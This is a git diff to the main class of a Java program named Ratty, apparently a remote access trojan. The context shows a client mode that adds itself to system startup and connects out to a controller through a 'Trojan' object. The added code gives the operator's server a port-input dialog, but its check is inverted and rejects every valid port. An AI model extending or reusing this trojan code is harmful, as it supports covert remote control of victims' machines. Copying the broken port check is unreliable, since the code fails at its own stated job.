@@ -5,6 +5,8 @@ import java.io.IOException;
 import java.net.URI;
 import java.net.URISyntaxException;
 
+import javax.swing.JOptionPane;
+
 import com.alee.laf.WebLookAndFeel;
 
 import de.sogomn.engine.util.FileUtils;
@@ -18,6 +20,9 @@ public final class Ratty {
 	private static String address;
 	private static int port;
 	private static boolean client;
+	
+	private static final String PORT_INPUT_MESSAGE = "Which port should the server be bind to?";
+	private static final String INVALID_PORT_MESSAGE = "Invalid port.";
 	
 	private static final int CONNECTION_INTERVAL = 2500;
 	private static final String CONNECTION_DATA_FILE_NAME = "/connection_data.txt";
@@ -61,6 +66,22 @@ public final class Ratty {
 		}
 	}
 	
+	private static int getPortInput() {
+		final String input = JOptionPane.showInputDialog(PORT_INPUT_MESSAGE);
+		
+		try {
+			final int port = Integer.parseInt(input);
+			
+			if (port > 0) {
+				return -1;
+			}
+			
+			return port;
+		} catch (final NumberFormatException | NullPointerException ex) {
+			return -1;
+		}
+	}
+	
 	public static void connectToHost(final String address, final int port) {
 		final ActiveClient newClient = new ActiveClient(address, port);
 		final Trojan trojan = new Trojan();
@@ -99,6 +120,14 @@ public final class Ratty {
 			addToStartup();
 			connectToHost(address, port);
 		} else {
+			final int port = getPortInput();
+			
+			if (port == -1) {
+				JOptionPane.showMessageDialog(null, INVALID_PORT_MESSAGE);
+				
+				return;
+			}
+			
 			startServer(port);
 		}
 	}
